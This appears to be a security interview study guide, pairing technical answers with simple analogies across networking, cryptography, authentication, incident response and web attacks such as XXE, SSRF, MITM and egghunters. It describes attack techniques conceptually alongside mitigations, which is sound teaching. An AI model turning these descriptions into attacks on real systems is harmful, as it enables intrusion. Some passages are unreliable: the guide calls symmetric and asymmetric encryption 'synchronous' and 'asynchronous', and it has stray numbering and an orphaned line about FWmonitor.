1. What is a three-way handshake?
The TCP three-way handshake establishes a connection between client and server. In
other words, A three way handshake is how two computers start talking on the internet.
SYN: Client sends SYN packet with random sequence number
SYN-ACK: Server responds with SYN-ACK, acknowledging client’s sequence number and
sending its own
ACK: Client acknowledges server’s sequence number
This ensures both parties are ready to communicate and agree on initial sequence numbers
for reliable data transmission.
EXAMPLE :
Step 1. You say hello.
Your computer sends a message that means, I want to talk.
Step 2. The other computer replies.
It says, I heard you and I am ready.
Step 3. You confirm.
You say, great, let us start.
After these three steps, both computers agree the connection is real and ready.
Then they start sending data, like web pages or messages.
This happens in TCP, the main system that moves data on the internet.
2. How do cookies work?
Cookies are small data pieces stored on the client by the server via Set-Cookie HTTP
header. The browser automatically sends cookies back to the server with subsequent
requests to the same domain. They’re used for session management, personalization, and
tracking. Security attributes include HttpOnly (prevents JavaScript access), Secure (HTTPS
only), and SameSite (CSRF protection).
Example :
Here’s how it works with websites:
First Visit (Getting Your “Stamp”)
You visit Amazon.com and log in with your username and password
Amazon’s computer says “Cool, you’re logged in! Here’s a special cookie to remember you”
Your browser saves this cookie (a tiny file) on your computer
Coming Back (Showing Your “Stamp”)
You close the tab and come back to Amazon later
Your browser automatically shows Amazon the cookie
Amazon’s computer reads it and says “Oh, it’s you again! You’re still logged in”
That’s why you don’t have to type your password every single time
What’s Actually in a Cookie?
It’s just a small piece of text that might say something like:
“This is user #12345”
“They last visited on January 11”
“They have 3 items in their shopping cart”
Why Websites Use Cookies:
Remember you’re logged in - So you don’t have to re-enter passwords constantly
Shopping carts - Remember what you wanted to buy
Preferences - Like “show me the website in dark mode”
3. How do sessions work?
Sessions maintain state across HTTP requests. The server creates a unique session ID
upon user login, stores session data server-side, and sends the session ID to the client
(typically via cookie). On subsequent requests, the client sends the session ID, allowing the
server to retrieve associated session data. Sessions expire after timeout or logout.
4. Explain how OAuth works.
OAuth 2.0 is an authorization framework allowing third-party applications limited access to
user resources without exposing credentials:
User initiates login with third-party app
App redirects to authorization server
User authenticates and grants permissions
Authorization server issues authorization code
App exchanges code for access token
App uses access token to access protected resources
Example :
You want to let Spotify see your Facebook friends
Instead of giving Spotify your Facebook password (like giving away your key)
You tell Facebook: “Let Spotify see my friends list, but nothing else”
Facebook says “okay” and gives Spotify a special permission slip
Spotify can now see your friends, but can’t post as you or change your password
5. Explain how JWT works.
JSON Web Tokens (JWT) are compact, self-contained tokens for secure information
transmission. Structure: Header.Payload.Signature
Header: Algorithm and token type
Payload: Claims (user data, expiration)
Signature: HMAC or RSA signature verifying integrity
JWTs are stateless - server doesn’t store session data. The signature ensures tokens
haven’t been tampered with. Commonly used for API authentication and single sign-on.
Example :
When you buy a movie ticket, it has:
Your name
The movie name
The showtime
A special hologram that can’t be faked
A JWT (JSON Web Token) is like that ticket. It contains information about you (like your
username) and has a special “signature” that proves it’s real and wasn’t changed by
someone else. Websites check this signature like a ticket checker checks the hologram.
6. What is a public key infrastructure flow ?
PKI manages digital certificates and public-key encryption:
Certificate Authority (CA)
↓ (issues certificate)
User/Entity
↓ (public key in certificate)
Verification Process:
Entity presents certificate
Verifier checks CA signature
Validates certificate status (CRL/OCSP)
Confirms identity and validity period
Analogical Example :
Like a school ID card with the principal’s signature:
You ask the school office for an ID card
They check you’re really a student
They make a card with your photo and the principal signs it
Now whenever you need to prove you’re a student, you show the card
5. People trust it because the principal signed it
7. Describe the difference between synchronous and asynchronous encryption.
Symmetric (synchronous): Same key for encryption and decryption. Fast, efficient for large
data. Examples: AES, DES, 3DES. Challenge: secure key distribution.
Asymmetric (asynchronous): Public-private key pair. Public key encrypts, private key
decrypts. Slower but solves key distribution. Examples: RSA, ECC. Used for key exchange
and digital signatures.
Hybrid approach: Use asymmetric to exchange symmetric key, then use symmetric for bulk
data.
Synchronous (Symmetric) = One key opens the lock: Like a house key - the same key locks
AND unlocks the door. Fast and simple, but you need to give everyone their own copy of
the key somehow.
Asynchronous (Asymmetric) = Mailbox system: Like a mailbox with a slot on top:
Anyone can DROP mail in (that’s the public key - everyone can use it)
Only YOU have the key to OPEN it and read the mail (that’s the private key - only you have
it)
Slower but solves the problem of “how do I give people the key without someone stealing
it?”
8. Describe SSL handshake.
SSL/TLS handshake establishes secure connection:
Client Hello: Supported cipher suites, TLS version
Server Hello: Selected cipher, certificate
Certificate Verification: Client validates server certificate
Key Exchange: Client generates pre-master secret, encrypts with server’s public key
Session Keys Generated: Both derive session keys from pre-master secret
Finished Messages: Both send encrypted “finished” messages to verify handshake
Example :
Kid 1: “Let’s talk in secret!”
Kid 2: “Okay! Here’s my secret handshake pattern”
Kid 1: Checks the pattern is correct
Kid 1: Creates a secret code and whispers it using the handshake pattern
Both kids now use that secret code to talk
9. How does HMAC work?
HMAC (Hash-based Message Authentication Code) provides message integrity and
authenticity:
HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))
Where K is secret key, m is message, H is hash function, opad/ipad are padding constants.
It combines a secret key with the message before hashing, preventing length extension
attacks that plague simple hash(key || message) constructions.
10. Why HMAC is designed in that way?
HMAC’s design addresses several security concerns:
Nested hashing: Prevents length extension attacks
Key padding: Ensures key influences entire hash process
Two-pass construction: Inner and outer hash provide additional security
Separation of key and message: Prevents certain cryptanalytic attacks
The double-hashing with XOR padding makes it resistant to attacks even if the underlying
hash function has weaknesses.
EXAMPLE :
If you just glued a sticker on an envelope, someone could:
Peel it off
Open the envelope
Put the sticker back
HMAC uses a special double-seal technique that’s like:
Putting a sticker on the inside AND outside
Using special glue that changes color if you touch it
Making it impossible to fake or move without breaking
11. What is the difference between authentication vs authorization?
Authentication: Verifying identity (”Who are you?”). Proves user is who they claim to be
through credentials, biometrics, or tokens.
Authorization: Determining access rights (”What can you do?”). Defines what authenticated
users can access or modify. Happens after authentication.
Simple difference:
Authentication = “WHO are you?”
Like showing your school ID to prove you’re a student
Proving your identity
Authorization = “What are you ALLOWED to do?”
Even though you’re a student, you can’t go in the teachers’ lounge
What you have permission to do
Example:
You log into Netflix (authentication - proving who you are)
But you can only watch kids shows, not adult shows (authorization - what you’re allowed to
access)
12. What’s the difference between Diffie-Hellman and RSA?
Diffie-Hellman: Key exchange protocol. Two parties establish shared secret over insecure
channel without transmitting the secret itself. Based on discrete logarithm problem.
Provides forward secrecy.
RSA: Asymmetric encryption and digital signatures. Uses factoring of large primes. Can
encrypt data directly and sign messages. Doesn’t provide forward secrecy without
modifications.
Example :
DH is primarily for key agreement; RSA is for encryption and signatures.
Imagine you and your friend want to pick a secret word, but you’re texting and your little
brother might read your texts:
You say a color
Friend says a color
You both mix the colors in your head using a special formula
You both end up with the same secret color, but your brother can’t figure it out!
13. How does Kerberos work?
Kerberos is a network authentication protocol using tickets:
AS Request: Client requests Ticket Granting Ticket (TGT) from Authentication Server
AS Response: Receives TGT encrypted with user’s password hash
TGS Request: Client presents TGT to Ticket Granting Server, requests service ticket
TGS Response: Receives service ticket
AP Request: Presents service ticket to application server
Access Granted: Server validates ticket, grants access
Uses symmetric encryption, time-based tickets, and mutual authentication. Default protocol
for Active Directory.
Example :
Like getting a special pass for school field day:
You ask the principal’s office: “Can I participate in field day?” (Authentication Server)
They check your name on the list and give you a special wristband (Ticket Granting Ticket)
You go to the gym teacher and show your wristband (Ticket Granting Server)
Gym teacher gives you a pass for the bounce house (Service Ticket)
You show the bounce house monitor your pass
They let you in!
The wristband and passes expire after a while, so you have to get new ones each day.
14. If you’re going to compress and encrypt a file, which do you do first and why?
Compress first, then encrypt. Reasons:
Compression finds patterns in data - encryption eliminates patterns
Encrypted data appears random and incompressible
Compressing encrypted data wastes resources and provides no benefit
Some encryption modes actually increase file size slightly
Example :
Compression is like folding clothes to fit more in a suitcase (finds patterns)
Encryption is like putting the suitcase through a shredder and scrambling it up (removes all
patterns)
If you shred first, you can’t fold it anymore - it’s just random pieces! So always fold first
(compress), THEN shred (encrypt).
15. How do I authenticate you and know you sent the message?
Use digital signatures:
Sender hashes the message
Encrypts hash with their private key (signature)
Sends message + signature
Receiver decrypts signature with sender’s public key
Hashes received message
Compares decrypted signature with computed hash
If they match, message is authentic and unmodified. You need the sender’s verified public
key (via PKI/certificates).
Example :
Imagine you have a special signature that’s impossible to fake, and everyone has a book
with pictures of real signatures.
You write a message
You sign it with your impossible-to-fake signature (digital signature)
Your friend receives it
They check your signature against the book
If it matches, they know it’s really from you and nobody changed it
In computers, this uses your “private key” (only you have) to sign, and everyone has your
“public key” to check if the signature is real.
16. Should you encrypt all data at rest?
Not necessarily all data, but consider: Encrypt when:
PII, financial data, health records
Passwords, API keys, secrets
Regulated data (GDPR, HIPAA, PCI-DSS)
Sensitive business data
May skip when:
Public information
Non-sensitive logs
Performance is critical and data isn’t sensitive
Cost outweighs risk
Balance security needs with performance impact, key management complexity, and
compliance requirements.
Not everything, but important stuff:
Think about what’s in your room:
Your diary, birthday money, secret notes = YES, lock these up
Your homework, book reports = Maybe, depends if it’s private
Your toy collection everyone can see = NO, doesn’t need a lock
Same with computer data:
Passwords, credit cards, medical records = YES, encrypt!
Your favorite color, public photos = NO, probably doesn’t need it
17. What is Perfect Forward Secrecy?
Perfect Forward Secrecy (PFS) ensures session keys aren’t compromised even if the
server’s private key is later compromised. Implemented using ephemeral key exchange
(DHE or ECDHE). Each session uses unique session keys that are never stored. If an
attacker records encrypted traffic and later obtains the private key, they still cannot decrypt
past sessions. Essential for long-term confidentiality.
Example :
Imagine you and your friend pass secret notes in class using a code. Even if a bully steals
your codebook later, they can’t read your old notes because:
You created a different code for each note
You burned each code after using it
Even with the codebook, old notes stay secret
Perfect Forward Secrecy means even if hackers steal a website’s master key later, they
can’t read your old conversations because each conversation used a unique temporary
key.
Network Level and Logging
What are common ports involving security, what are the risks and mitigations?
Common ports:
20/21 (FTP): Unencrypted; use SFTP/FTPS
22 (SSH): Brute force attacks; use key authentication, fail2ban
23 (Telnet): Unencrypted; replace with SSH
25 (SMTP): Spam relay; require authentication, use port 587
53 (DNS): DNS tunneling, DDoS amplification; use DNSSEC, rate limiting
80 (HTTP): Unencrypted; redirect to HTTPS
443 (HTTPS): Still vulnerable to application attacks; use WAF, proper TLS config
3306 (MySQL): Exposed databases; bind to localhost, use firewall
3389 (RDP): Brute force; use VPN, strong passwords, NLA
8080/8443 (Alt HTTP/HTTPS): Often forgotten in security policies; monitor like standard
ports
Example :
Door 22 (SSH) = Back door for employees (secure entrance, but people try to pick the lock)
Door 80 (HTTP) = Main entrance with no security guard (everyone can see in)
Door 443 (HTTPS) = Main entrance with a security guard (encrypted, safer)
Door 3389 (RDP) = Remote control room (hackers love breaking in here)
Door 25 (Email) = Mail room (spammers try to use it)
Which one for DNS?
Port 53 for DNS, using both UDP (queries) and TCP (zone transfers, large responses).
UDP for speed, TCP for reliability and larger responses.
Port 53 - like the phone book:
DNS is like calling 411 to get a phone number. Port 53 is the special line just for looking up
addresses.
When you type “google.com,” your computer calls port 53 to ask “What’s the address for
Google?” and it tells you the number (IP address).
Describe HTTPS and how it is used.
HTTPS is HTTP over TLS/SSL, providing:
Encryption: Data confidentiality in transit
Authentication: Server identity verification via certificates
Integrity: Prevents tampering using MAC
Used for secure web communications, protecting credentials, financial transactions, and
sensitive data. Modern best practice for all web traffic, not just sensitive pages.
Example :
HTTPS = Secret tunnel between you and a website:
Regular HTTP is like sending postcards - anyone handling the mail can read it.
HTTPS is like putting your postcard in a locked box, then mailing the box. Only the person
with the key can open it and read your postcard.
That’s why you always want the lock icon in your browser, especially when typing
passwords or credit card numbers!
What is the difference between HTTPS and SSL?
HTTPS: Protocol (HTTP over TLS/SSL) SSL: Deprecated encryption protocol (SSL 2.0, 3.0
- both insecure)
Modern HTTPS uses TLS (Transport Layer Security), which replaced SSL. People still say
“SSL” colloquially but mean TLS. Current versions: TLS 1.2 and TLS 1.3.
Example :
SSL is an old name for the lock, HTTPS is what we call the whole system:
Think of it like this:
SSL = The old style padlock they used to use (now we use newer, better locks called TLS)
HTTPS = The secure mail service that uses those locks
People still say “SSL” even though we now use “TLS” because everyone’s used to saying it.
It’s like how people still say “tape” a show even though we don’t use tapes anymore.
How does threat modeling work?
Systematic approach to identify and mitigate threats:
Identify assets: What needs protection?
Identify threats: STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial
of Service, Elevation of Privilege)
Identify vulnerabilities: Where are weaknesses?
Assess risk: Likelihood × Impact
Define mitigations: Controls and countermeasures
Validate: Test and reassess
Frameworks: STRIDE, PASTA, DREAD, Attack Trees. Should be iterative and ongoing.
Example :
Like planning home security:
What do you want to protect? (Your bike, TV, jewelry)
Who might try to steal it? (Burglars, nosy neighbors)
How could they get in? (Broken window, unlocked door, back yard)
How bad would it be? (Bike = sad, jewelry = very sad)
What can you do? (Locks, alarm, dog, lights)
Check it worked! (Test the alarm)
Companies do this for their computers and data!
What is a subnet and how is it useful in security?
A subnet is a logical subdivision of an IP network. Security benefits:
Network segmentation: Isolate sensitive systems
Blast radius reduction: Contain breaches
Access control: Firewall rules between subnets
Traffic monitoring: Easier to monitor inter-subnet traffic
Compliance: Separate PCI, HIPAA, or other regulated systems
Example: Separate subnets for DMZ, application servers, databases, management.
Like neighborhoods in a city:
Imagine a big city (network) divided into neighborhoods (subnets):
Downtown (web servers)
Residential (employee computers)
Industrial (databases)
Government district (admin systems)
This helps because:
If there’s trouble in one neighborhood, it doesn’t spread everywhere
Police can watch roads between neighborhoods (firewalls between subnets)
Each neighborhood can have its own rules
What is subnet mask?
A subnet mask determines which portion of an IP address represents the network and
which represents hosts. Written in dotted decimal (255.255.255.0) or CIDR notation (/24).
Example: 192.168.1.0/24
Network: 192.168.1
Hosts: 0-255 (usable: 1-254)
Mask: 255.255.255.0
Used for routing decisions and network segmentation.
Example :
Like a zip code that says which neighborhood you’re in:
A subnet mask is like a filter that tells you “which part of this address is the neighborhood,
and which part is the house number?”
Example:
Full address: “192.168.1.42”
Subnet mask says: “192.168.1 = the neighborhood, 42 = the house”
This helps mail carriers (routers) know whether to deliver locally or send it to another
neighborhood.
Explain what traceroute is.
Traceroute maps the path packets take to reach a destination by exploiting TTL (Time To
Live). It sends packets with incrementing TTL values:
First packet: TTL=1, expires at first hop (router sends ICMP Time Exceeded)
Second packet: TTL=2, expires at second hop
Continues until destination reached
Shows each hop’s IP address and latency. Useful for diagnosing routing issues and
network topology discovery.
Example :
Like tracking your package:
When you order something online, you can track it:
Left warehouse
Arrived at local hub
On delivery truck
At your door
Traceroute does this for internet messages! It shows every “hop” (computer/router) your
message passes through to reach a website. If your internet is slow, traceroute shows
where the delay is happening.
Explain TCP/IP concepts.
TCP/IP is the protocol suite for internet communications:
IP (Internet Protocol): Addressing and routing packets between networks
TCP (Transmission Control Protocol): Reliable, ordered, error-checked data stream
UDP (User Datagram Protocol): Connectionless, faster, no guarantees
ICMP: Error messages and diagnostics
Four layers: Network Access, Internet, Transport, Application
TCP provides connection-oriented communication with three-way handshake, flow control,
and guaranteed delivery.
What is OSI model?
Seven-layer networking model:
Physical: Cables, signals, bits
Data Link: MAC addresses, switches, frames
Network: IP addresses, routing, packets
Transport: TCP/UDP, ports, segments
Session: Connection management
Presentation: Encryption, compression, format
Application: HTTP, FTP, SMTP, applications
Mnemonic: “Please Do Not Throw Sausage Pizza Away”
How does a router differ from a switch?
Router (Layer 3):
Routes between different networks
Uses IP addresses
Makes forwarding decisions based on routing tables
Connects LANs to WANs
Provides NAT, firewall capabilities
Switch (Layer 2):
Connects devices within same network
Uses MAC addresses
Forwards frames based on MAC table
Creates collision domains
Faster for local traffic
Example :
Router = Mail sorting facility (between cities):
Connects different neighborhoods/cities
Reads addresses and decides “this goes to New York, this goes to Chicago”
Connects your home to the internet
Switch = Internal mail room (within one building):
Connects computers in the same office
Faster because it doesn’t have to make big decisions
Like delivering mail between offices in the same building
Explain the difference between TCP and UDP. Which is more secure and why?
TCP:
Connection-oriented (three-way handshake)
Reliable, ordered delivery
Error checking and retransmission
Flow control
Slower, more overhead
UDP:
Connectionless
No delivery guarantees
No ordering
Faster, less overhead
Used for streaming, DNS, VoIP
Security: Neither is inherently “more secure.” TCP’s connection tracking prevents some
spoofing attacks. UDP is easier to spoof but isn’t necessarily less secure - security depends
on application-layer controls and whether the protocol needs TCP’s features.
EXAMPLE :
TCP vs UDP - Which is more secure?
TCP = Certified mail (with receipt):
“Did you get my letter?”
“Yes! Here’s confirmation!”
Slower but reliable
Used for important stuff (web pages, downloads)
UDP = Regular mail (just send it):
No confirmation
Faster but might get lost
Used when speed matters (video calls, games)
What is the difference between IPSEC Phase 1 and Phase 2?
Phase 1 (IKE SA): Establishes secure, authenticated channel for negotiation
Negotiates encryption/hashing algorithms
Authenticates peers (pre-shared key, certificates)
Establishes IKE Security Association
Modes: Main Mode (6 messages) or Aggressive Mode (3 messages)
Phase 2 (IPsec SA): Negotiates actual IPsec tunnel
Negotiates IPsec parameters (ESP/AH)
Establishes IPsec Security Associations
Defines traffic to protect (interesting traffic)
Quick Mode for negotiation
Phase 1 protects Phase 2 negotiations. Phase 2 protects actual data.
Phase 1 = The secret handshake:
You and your friend create a secret handshake
Decide on the club rules
Make sure you’re both really club members
This creates a safe way to talk about club secrets
Phase 2 = The actual secret tunnel:
Now that you trust each other, you build the actual secret tunnel
Decide what messages go through the tunnel
Use the tunnel to pass notes in class
Phase 1 protects Phase 2’s setup, and Phase 2 protects your actual data.
What are biggest AWS security vulnerabilities?
Misconfigured S3 buckets: Public access to sensitive data
Overly permissive IAM policies: Excessive permissions, unused credentials
Exposed access keys: Keys in code repositories, public GitHub
Missing encryption: Data at rest/transit not encrypted
Security group misconfigurations: Open ports (0.0.0.0/0)
Lack of MFA: No multi-factor authentication
No logging/monitoring: CloudTrail, GuardDuty disabled
Unpatched instances: Missing security updates
Public snapshots: EBS, RDS snapshots publicly accessible
Shared responsibility gaps: Misunderstanding AWS vs. customer responsibilities
EXAMPLE :
Like leaving things unlocked in your house:
S3 buckets left open = Like leaving your front door unlocked - anyone can walk in and see
your stuff
Too many keys given out = Like giving house keys to everyone instead of just family
Keys left in public = Like posting your house key photo on Instagram
No locks on rooms = Not encrypting important files
Open windows everywhere = Security groups allowing everyone in
No alarm system = No monitoring/logging
Old broken locks = Not patching/updating
How do web certificates for HTTPS work?
Web certificates (X.509) validate server identity:
Certificate issuance: CA verifies domain ownership, issues certificate
Certificate contains: Domain name, public key, CA signature, validity period
Client validation: Browser checks CA signature, validity period, revocation status
(CRL/OCSP)
Trust chain: Certificate → Intermediate CA → Root CA (in browser trust store)
Key exchange: Server’s public key used to establish session keys
Certificates prevent MITM attacks by proving server identity.
EXAMPLE :
When you meet someone, how do you know they’re really who they say they are? You ask
to see their driver’s license because:
It has their photo
The government verified it’s real
It has a special hologram you can’t fake
It expires so it must be renewed
Web certificates are the same:
Website shows its certificate
Your browser checks if a trusted authority verified it (like the DMV)
Checks it hasn’t expired
Checks it matches the website name
That’s how you know you’re really on Amazon.com and not a fake copy!
What is the purpose of TLS?
TLS (Transport Layer Security) provides:
Confidentiality: Encryption prevents eavesdropping
Integrity: MAC ensures data isn’t modified in transit
Authentication: Certificates verify server (and optionally client) identity
Protects data in transit across insecure networks. Used by HTTPS, email, VPNs, and other
protocols.
Example :
Three superpowers for internet messages:
Invisibility cloak (Encryption) = Nobody can read your messages
Wax seal (Integrity) = Nobody can change your messages without you knowing
ID badge (Authentication) = You know who you’re talking to
TLS gives websites these three superpowers to protect your passwords, credit cards, and
private messages.
Is ARP UDP or TCP?
Neither. ARP (Address Resolution Protocol) operates at Layer 2 (Data Link), below the
transport layer where TCP/UDP exist. ARP resolves IP addresses to MAC addresses within
a local network. It sends broadcast requests and receives unicast replies directly over
Ethernet frames.
Example :
Neither - it’s like the building’s intercom system:
TCP and UDP are like postal services (Layer 4). ARP is like the intercom in an apartment
building (Layer 2).
When you want to talk to apartment 5B, you buzz their intercom - you don’t mail them a
letter! ARP is for talking to computers in the same building (local network), not sending
letters across town.
Explain what information is added to a packet at each stop of the 7 layer OSI model.
Layer 7 (Application): Application data (HTTP request, email, etc.) Layer 6 (Presentation):
Encoding, encryption, compression metadata Layer 5 (Session): Session identifiers, sync
points Layer 4 (Transport): Source/destination ports, sequence numbers, checksum
(TCP/UDP header) Layer 3 (Network): Source/destination IP addresses, TTL, protocol (IP
header) Layer 2 (Data Link): Source/destination MAC addresses, frame check sequence
(Ethernet header/trailer) Layer 1 (Physical): Converts to electrical signals, bits on wire
Each layer encapsulates the previous layer’s data.
What is a firewall? How does it work? How does it work in cloud computing?
Firewall: Network security device controlling traffic based on rules.
Operation:
Packet filtering: Examines headers (IP, port, protocol)
Stateful inspection: Tracks connection state
Application layer: Deep packet inspection
Rules: Allow/deny based on source, destination, port, protocol
Cloud firewalls:
Security Groups (AWS): Stateful, instance-level, whitelist-based
Network ACLs: Stateless, subnet-level, numbered rules
WAF: Application layer, protects against OWASP Top 10
Virtual appliances: Traditional firewalls as VMs
Cloud-native: Distributed, scalable, API-configured
Key difference: Cloud firewalls are software-defined, distributed, and managed via
APIs/console.
EXAMPLE :
A security guard at the door:
A firewall is like a bouncer at a club:
Checks everyone coming in
Follows a list of rules (”No kids under 21,” “No weapons”)
Can kick people out
Decides who can enter and who can’t
For computers:
Blocks bad websites/hackers
Only lets safe traffic through
Follows rules you set
Protects your computer/network
Difference between IPS and IDS?
IDS (Intrusion Detection System):
Passive monitoring
Alerts on suspicious activity
Doesn’t block traffic
Out-of-band deployment
Lower risk of false positive impact
IPS (Intrusion Prevention System):
Active blocking
Prevents malicious traffic
Inline deployment
Drops/blocks suspicious packets
Risk: False positives block legitimate traffic
IPS is essentially IDS with blocking capability. IPS is deployed inline; IDS monitors a copy
of traffic.
EXAMPLE :
IDS (Intrusion Detection System) = Security camera:
Watches what’s happening
Alerts you if something suspicious happens
“Hey! Someone’s trying to break in!”
Doesn’t actually stop them
IPS (Intrusion Prevention System) = Security guard with a taser:
Also watches what’s happening
But STOPS the bad guy immediately
Blocks the attack automatically
Risk: Might accidentally taser a good guy (false positive)
How do you harden a system?
Operating system hardening:
Minimize attack surface: Remove unnecessary services, applications
Patch management: Regular security updates
Strong authentication: Complex passwords, MFA, key-based SSH
Principle of least privilege: Minimal necessary permissions
Firewall configuration: Block unused ports
Disable unnecessary accounts: Remove default accounts
Audit logging: Enable comprehensive logging
Encryption: Full disk encryption, encrypted connections
Security baselines: CIS benchmarks, DISA STIGs
Regular audits: Vulnerability scanning, penetration testing
Endpoint protection: Antivirus, EDR
Network segmentation: Isolate critical systems
How does HTTPS work?
HTTPS = HTTP + TLS/SSL:
Client initiates: Requests HTTPS connection
TLS handshake: (see SSL handshake details earlier)
Negotiate cipher suites
Exchange certificates
Generate session keys
Encrypted communication: All HTTP data encrypted with session keys
Data integrity: HMAC ensures messages aren’t tampered
Connection close: Secure termination
Provides encryption, authentication, and integrity for web communications.
What would you do if you discovered an infected host?
Incident response process:
Contain: Isolate host from network (disconnect or VLAN quarantine)
Identify: Determine malware type, scope of infection
Preserve evidence: Memory dump, disk image for forensics
Eradicate: Remove malware, clean system
Recover: Restore from clean backup or rebuild
Monitor: Watch for reinfection or lateral movement
Document: Timeline, actions taken, lessons learned
Post-incident: Root cause analysis, improve controls
Priority: Prevent spread before detailed investigation.
You got the memory dump of a potentially compromised system, how are you going to
approach its analysis?
Memory forensics approach:
Acquire: Use Volatility, Rekall, or similar tools
Identify OS: Determine OS version and profile
Process analysis: List running processes, look for suspicious names, unsigned binaries,
unusual parent-child relationships
Network connections: Active connections, listening ports
Code injection: Check for DLL injection, process hollowing
Registry analysis: Persistence mechanisms, startup items
Malware artifacts: Known IOCs, YARA rules
Timeline: Establish sequence of events
Extract: Dump suspicious processes, DLLs for deeper analysis
Correlate: Compare with disk artifacts, logs
Tools: Volatility, Rekall, Memoryze, Redline
How would you detect a DDOS attack?
Detection indicators:
Traffic volume: Sudden spike in requests/bandwidth
Geographic anomalies: Traffic from unusual locations
Performance degradation: High latency, timeouts
Resource exhaustion: CPU, memory, bandwidth maxed
Failed connections: SYN floods, half-open connections
Pattern analysis: Repeated requests, similar user agents
Log analysis: Excessive errors, failed authentication attempts
Tools/Methods:
Network monitoring (NetFlow, sFlow)
Rate limiting triggers
Anomaly detection (baseline vs. current)
CDN/WAF alerts
SIEM correlation
Distinguish from legitimate traffic spikes (product launch, viral content).
How does the kernel know which function to call for the user?
Through system calls (syscalls):
User program invokes syscall (e.g., read, write, open)
Library wrapper prepares syscall number in register
Interrupt triggered (INT 0x80 on x86, or syscall instruction)
CPU switches to kernel mode
Kernel’s syscall handler looks up function in system call table using syscall number
Executes corresponding kernel function
Returns to user mode with result
System call table maps syscall numbers to kernel function pointers. Each syscall has
unique number (e.g., Linux: read=0, write=1).
How would you go about reverse-engineering a custom protocol packet?
Reverse engineering approach:
Capture traffic: Wireshark, tcpdump
Identify patterns: Fixed positions, magic bytes, length fields
Analyze structure: Headers, payloads, footers
Compare samples: Multiple captures to identify variable/fixed fields
Hypothesis testing: Modify packets, observe responses
Field identification: Sequence numbers, checksums, timestamps
Encryption detection: High entropy suggests encryption
State machine: Map protocol flow, handshake sequences
Documentation: Create protocol specification
Validation: Implement parser/generator
Tools: Wireshark, scapy, 010 Editor, Canape
OWASP Top 10, Pentesting and/or Web Applications
Differentiate XSS from CSRF.
XSS (Cross-Site Scripting):
Attacker injects malicious script into web page
Script executes in victim’s browser
Steals cookies, session tokens, sensitive data
Types: Reflected, Stored, DOM-based
Mitigation: Input validation, output encoding, CSP
CSRF (Cross-Site Request Forgery):
Tricks authenticated user into performing unwanted actions
Exploits user’s existing authentication
Executes state-changing requests on behalf of victim
Doesn’t steal data, causes unwanted actions
Mitigation: CSRF tokens, SameSite cookies, checking Referer header
Key difference: XSS injects code; CSRF abuses trust.
What do you do if a user brings you a pc that is acting ‘weird’? You suspect malware.
Investigation steps:
Don’t panic user: Gather symptoms calmly
Isolate: Disconnect from network (don’t shutdown yet)
Document: Screenshot errors, note behaviors
Quick checks: Task Manager (unusual processes), browser extensions, startup programs
Safe mode: Reboot to safe mode with networking
Run scans: Anti-malware, rootkit scanners
Check modifications: Hosts file, proxy settings, DNS
Review logs: Event Viewer, browser history
If infected:
Change passwords from clean device
Notify IT/Security team
Reimageconsider reimage vs. cleaning
 10. Prevention: Update software, security awareness training

FWmonitor is specialized for Check Point debugging; tcpdump is general-purpose packet
capture.
Do you know what XXE is?
XXE (XML External Entity):
Vulnerability in XML parsers
Attacker provides XML input with malicious external entity reference
Parser processes external entity, leading to:
File disclosure (reading /etc/passwd)
SSRF (internal network requests)
DoS (billion laughs attack)
 RCE in some cases
Explain man-in-the-middle attacks.
MITM attack: Attacker secretly intercepts and potentially alters communication between two
parties who believe they’re directly communicating.
Techniques:
ARP spoofing: Attacker associates their MAC with victim’s IP
DNS spoofing: Redirect domains to attacker’s IP
Evil twin: Rogue WiFi access point
SSL stripping: Downgrade HTTPS to HTTP
Session hijacking: Steal session cookies
Objectives: Eavesdropping, data theft, credential harvesting, malware injection
Prevention: HTTPS with certificate pinning, DNSSEC, VPN, avoid public WiFi, HSTS
What is a Server Side Request Forgery attack?
SSRF: Attacker tricks server into making requests to unintended locations.
Attack scenarios:
Internal network access: Reach internal services not exposed externally
Cloud metadata: Access AWS metadata (169.254.169.254) to steal credentials
Port scanning: Enumerate internal network
File reading: Access local files via file:// protocol
Bypass firewalls: Use server as proxy
Example: Image upload feature that fetches URLs - attacker provides internal URL.
Mitigation:
Whitelist allowed domains/IPs
Block private IP ranges (RFC1918)
Disable unnecessary protocols (file://, gopher://)
Network segmentation
Validate and sanitize URLs
Describe what are egghunters and their use in exploit development.
Egghunter: Small shellcode stub used when direct shellcode injection isn’t possible due to
space constraints.
Purpose: Searches memory for larger shellcode payload marked with unique “egg”
(signature).
Use cases:
Limited buffer space for exploit
Split payloads across memory
Unreliable payload location
Operation:
Inject small egghunter code
Inject larger shellcode with egg marker elsewhere
Egghunter searches memory for egg signature
Executes found shellcode
Useful in exploits with small overflow buffers but ability to place payload elsewhere in
memory.
How is padlock icon in browser generated?
HTTPS indicators:
Certificate validation: Browser verifies server certificate
Signed by trusted CA
Not expired
Matches domain name
Not revoked (CRL/OCSP check)
Encryption established: TLS handshake successful
Secure connection: All resources loaded over HTTPS
Display: Padlock icon shown in address bar
Types:
Standard padlock: DV (Domain Validated) certificate
Company name: EV (Extended Validation) certificate (less common now)
Mixed content (HTTP resources on HTTPS page): Broken padlock or warning
What is Same Origin Policy and CORS?
Same Origin Policy (SOP):
Browser security mechanism
Script from one origin can’t access data from different origin
Origin = protocol + domain + port
Prevents malicious sites from reading sensitive data from other sites
CORS (Cross-Origin Resource Sharing):
Mechanism to relax SOP
Server explicitly allows specific origins to access resources
Uses HTTP headers:
Access-Control-Allow-Origin: Allowed origins
Access-Control-Allow-Methods: Allowed HTTP methods
Access-Control-Allow-Headers: Allowed headers
Preflight requests (OPTIONS) for complex requests
Example: API at api.example.com allowing requests from app.example.com
Databases
How would you secure a Mongo database?
MongoDB security:
Authentication: Enable --auth, use strong passwords
Authorization: Role-based access control (RBAC), principle of least privilege
Encryption: TLS for connections, encryption at rest

Update: Keep MongoDB current with security patches
Auditing: Enable audit logs
Backup: Regular encrypted backups
Disable: Anonymous access, JavaScript server-side execution if unused
Configuration: Change default port, disable HTTP status interface
Monitoring: Alert on failed auth, unusual queries
Postgres?
PostgreSQL security:
Authentication: Use md5 or scram-sha-256, not trust/password
pg_hba.conf: Configure host-based authentication strictly
Role management: GRANT specific permissions, avoid SUPERUSER
SSL/TLS: Require encrypted connections
Network: Listen only on needed interfaces, firewall
Updates: Apply security patches promptly
Audit: pgaudit extension for logging
Row-level security: RLS policies for fine-grained access
Backup: Encrypted backups, test restores
Hardening: Disable unnecessary extensions, remove default databases
